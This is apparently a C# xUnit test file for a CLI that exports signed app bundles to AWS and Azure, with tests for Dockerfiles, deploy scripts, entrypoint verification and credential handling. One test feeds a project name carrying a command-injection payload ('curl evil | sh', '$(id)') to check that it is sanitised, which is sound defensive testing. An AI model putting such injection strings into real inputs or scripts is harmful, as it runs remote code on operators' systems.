using System.Text.Json;
using Ashlar.CLI.Commands;
using Ashlar.Manifest;
using Ashlar.Manifest.Ledger;
using Ashlar.Manifest.Signing;
using FluentAssertions;
using Xunit;

namespace Ashlar.Tests.CLI.Tests.Commands;

/// <summary>
/// Pins the deterministic half of `ashlar export aws|azure`: the staged cloud bundle — the app,
/// the Dockerfile layered on the published runtime image, the verify-before-run entrypoint, the
/// per-target deploy script, and an honest descriptor. The deploy scripts touch the cloud only
/// when an operator runs them; nothing here does.
/// </summary>
[Trait("Category", "CLI")]
public sealed class CloudBundleTests : IDisposable
{
    private readonly string _dir;

    public CloudBundleTests()
    {
        _dir = Path.Combine(Path.GetTempPath(), "cloud-" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(_dir);
    }

    public void Dispose()
    {
        if (Directory.Exists(_dir))
        {
            Directory.Delete(_dir, recursive: true);
        }
    }

    private void Scaffold()
    {
        ProjectScaffold.TryScaffold("triage", out var m, out var p, out var reason).Should().BeTrue(reason);
        File.WriteAllText(Path.Combine(_dir, "ashlar.yaml"), m);
        File.WriteAllText(Path.Combine(_dir, "ashlar.policy.yaml"), p);
    }

    private async Task Certify()
    {
        var signer = OperatorKey.Generate(Path.Combine(_dir, "keys"));
        var m = File.ReadAllText(Path.Combine(_dir, "ashlar.yaml"));
        var p = File.ReadAllText(Path.Combine(_dir, "ashlar.policy.yaml"));
        await new InstanceLedger(Path.Combine(_dir, ".ashlar")).AppendVerificationAsync(
            signer, InstanceLedger.Subject(m, p), verified: true,
            [new LedgerCourse { Name = "contract", Passed = true, Detail = "ok" }], DateTimeOffset.UtcNow);
    }

    [Fact]
    public async Task Aws_bundle_carries_the_app_the_image_and_the_deploy_script()
    {
        Scaffold();
        await Certify();
        var info = NativeBundle.Describe(_dir, "aws");
        var bundle = Path.Combine(_dir, "out-aws");

        var written = CloudBundle.Stage(_dir, bundle, info, CloudTarget.Aws);

        File.Exists(Path.Combine(bundle, "app", "ashlar.yaml")).Should().BeTrue();
        Directory.Exists(Path.Combine(bundle, "app", ".ashlar")).Should().BeTrue("the signed ledger travels");
        written.Should().Contain(new[] { "Dockerfile", "entrypoint.sh", "deploy-aws.sh", "bundle.json", "README.md" });

        var dockerfile = File.ReadAllText(Path.Combine(bundle, "Dockerfile"));
        dockerfile.Should().StartWith($"FROM {CloudBundle.RuntimeImage}");
        dockerfile.Should().Contain("COPY --chown=app:app app /work/app");

        var deploy = File.ReadAllText(Path.Combine(bundle, "deploy-aws.sh"));
        deploy.Should().Contain("aws ecr").And.Contain("aws ecs run-task").And.Contain("FARGATE");
        deploy.Should().Contain("NAME=\"triage\"");
    }

    [Fact]
    public async Task Azure_bundle_uses_acr_build_and_container_instances()
    {
        Scaffold();
        await Certify();
        var info = NativeBundle.Describe(_dir, "azure");
        var bundle = Path.Combine(_dir, "out-azure");

        var written = CloudBundle.Stage(_dir, bundle, info, CloudTarget.Azure);

        written.Should().Contain("deploy-azure.sh").And.NotContain("deploy-aws.sh");
        var deploy = File.ReadAllText(Path.Combine(bundle, "deploy-azure.sh"));
        deploy.Should().Contain("az acr build").And.Contain("az container create").And.Contain("restartPolicy: Never");
    }

    [Fact]
    public async Task Deploy_scripts_keep_secrets_and_requests_out_of_harms_way()
    {
        // The two findings the in-flight review flagged, pinned: the ACR admin password must never
        // ride a command line (process listings are world-readable), and an operator request must
        // be escaped before it is spliced into the task-definition JSON / deployment YAML.
        Scaffold();
        await Certify();

        CloudBundle.Stage(_dir, Path.Combine(_dir, "out-sec-aws"), NativeBundle.Describe(_dir, "aws"), CloudTarget.Aws);
        var aws = File.ReadAllText(Path.Combine(_dir, "out-sec-aws", "deploy-aws.sh"));
        aws.Should().Contain("CMD=\"[\\\"$(json_escape \"$REQUEST\")\\\"]\"",
            "the request must pass through json_escape at the exact splice into the task definition");
        aws.Should().NotContain("[\\\"$REQUEST\\\"]", "raw interpolation of the request into JSON is an injection");
        aws.Should().NotContain("sleep 10", "IAM propagation is a retry that surfaces the real error, not a blind sleep");
        aws.Should().NotContain("\r", "a CRLF deploy script is unrunnable under POSIX sh, whatever platform built the CLI");

        CloudBundle.Stage(_dir, Path.Combine(_dir, "out-sec-az"), NativeBundle.Describe(_dir, "azure"), CloudTarget.Azure);
        var az = File.ReadAllText(Path.Combine(_dir, "out-sec-az", "deploy-azure.sh"));
        az.Should().NotContain("--registry-password", "the ACR password must never appear on a command line");
        az.Should().NotContain("--command-line", "the request rides as an exec-style array, never through a shell-parsed string");
        az.Should().Contain("command: [\\\"/work/entrypoint.sh\\\", \\\"$(yaml_escape \"$REQUEST\")\\\"]",
            "the request must pass through yaml_escape at the exact splice into the deployment spec");
        az.Should().Contain("PASSWORD_ESC=$(yaml_escape \"$PASSWORD\")",
            "credential escaping must be a standalone assignment — inside the heredoc its refusal would fail open");
        az.Should().Contain("chmod 600", "the deployment spec carrying the password is operator-readable only");
        az.Should().Contain("trap 'rm -f \"$SPEC\"' EXIT", "the spec holding the password must not outlive the run");
        az.Should().NotContain("\r", "a CRLF deploy script is unrunnable under POSIX sh, whatever platform built the CLI");
    }

    [Fact]
    public async Task A_hostile_or_awkward_project_name_never_reaches_the_scripts_raw()
    {
        // CloudBundle.Safe is the only barrier between a manifest's metadata.name and a shell
        // script the operator executes — and between that name and ECR/ACR/ACI naming rules.
        Scaffold();
        await Certify();
        var info = NativeBundle.Describe(_dir, "aws");

        var hostile = info with { Name = "demo\"; curl evil | sh; $(id) `x`" };
        CloudBundle.Stage(_dir, Path.Combine(_dir, "out-hostile"), hostile, CloudTarget.Aws);
        var deploy = File.ReadAllText(Path.Combine(_dir, "out-hostile", "deploy-aws.sh"));
        var nameLine = deploy.Split('\n').First(l => l.StartsWith("NAME=", StringComparison.Ordinal));
        nameLine.Should().MatchRegex("^NAME=\"[a-z0-9-]+\"$", "a manifest name must never smuggle shell into the deploy script");

        var awkward = info with { Name = "-Q-" };
        CloudBundle.Stage(_dir, Path.Combine(_dir, "out-awkward"), awkward, CloudTarget.Azure);
        File.ReadAllText(Path.Combine(_dir, "out-awkward", "deploy-azure.sh"))
            .Should().Contain("NAME=\"app\"", "a name too thin to satisfy cloud naming rules falls back rather than failing every command");

        var lengthy = info with { Name = new string('x', 80) + "-tail" };
        CloudBundle.Stage(_dir, Path.Combine(_dir, "out-long"), lengthy, CloudTarget.Aws);
        var longLine = File.ReadAllText(Path.Combine(_dir, "out-long", "deploy-aws.sh"))
            .Split('\n').First(l => l.StartsWith("NAME=", StringComparison.Ordinal));
        longLine.Length.Should().BeLessThanOrEqualTo("NAME=\"\"".Length + 32, "derived cloud names must clear ACR/ACI/IAM length limits");
    }

    [Fact]
    public async Task The_runtime_image_can_be_pinned_and_is_recorded_honestly()
    {
        Scaffold();
        await Certify();
        var bundle = Path.Combine(_dir, "out-pinned");
        var pinned = "ghcr.io/ianfrelinger/nexo-cli@sha256:1111111111111111111111111111111111111111111111111111111111111111";

        CloudBundle.Stage(_dir, bundle, NativeBundle.Describe(_dir, "aws"), CloudTarget.Aws, runtimeImage: pinned);

        File.ReadAllText(Path.Combine(bundle, "Dockerfile")).Should().StartWith($"FROM {pinned}");
        var d = JsonSerializer.Deserialize<JsonElement>(File.ReadAllText(Path.Combine(bundle, "bundle.json")));
        d.GetProperty("runtimeImage").GetString().Should().Be(pinned, "the descriptor must record the verifier that will actually run the app");
    }

    [Fact]
    public async Task The_entrypoint_verifies_before_it_runs()
    {
        Scaffold();
        await Certify();
        var bundle = Path.Combine(_dir, "out-ep");

        CloudBundle.Stage(_dir, bundle, NativeBundle.Describe(_dir, "aws"), CloudTarget.Aws);

        var ep = File.ReadAllText(Path.Combine(bundle, "entrypoint.sh"));
        var verifyAt = ep.IndexOf("verify --path /work/app", StringComparison.Ordinal);
        var runAt = ep.IndexOf("run \"$@\" --path /work/app", StringComparison.Ordinal);
        verifyAt.Should().BeGreaterThan(-1, "the container must verify");
        runAt.Should().BeGreaterThan(verifyAt, "verify must come before run — a tampered app exits before serving");
        ep.Should().StartWith("#!/bin/sh\nset -e", "a failed verify must abort the container");
    }

    [Fact]
    public async Task The_descriptor_is_honest_about_certification()
    {
        Scaffold();
        await Certify();
        var bundle = Path.Combine(_dir, "out-desc");

        CloudBundle.Stage(_dir, bundle, NativeBundle.Describe(_dir, "aws"), CloudTarget.Aws);

        var d = JsonSerializer.Deserialize<JsonElement>(File.ReadAllText(Path.Combine(bundle, "bundle.json")));
        d.GetProperty("format").GetString().Should().Be(CloudBundle.Format);
        d.GetProperty("target").GetString().Should().Be("aws");
        d.GetProperty("certified").GetBoolean().Should().BeTrue();
        d.GetProperty("signer").GetString().Should().StartWith("ed25519:");
        d.GetProperty("runtimeImage").GetString().Should().Be(CloudBundle.RuntimeImage);
    }

    [Fact]
    public void An_uncertified_project_stages_with_certified_false()
    {
        // Verified-but-unsigned exports fine — the descriptor just must not overclaim.
        Scaffold();
        var bundle = Path.Combine(_dir, "out-unsigned");

        CloudBundle.Stage(_dir, bundle, NativeBundle.Describe(_dir, "azure"), CloudTarget.Azure);

        var d = JsonSerializer.Deserialize<JsonElement>(File.ReadAllText(Path.Combine(bundle, "bundle.json")));
        d.GetProperty("certified").GetBoolean().Should().BeFalse();
        d.GetProperty("signer").ValueKind.Should().Be(JsonValueKind.Null);
    }
}
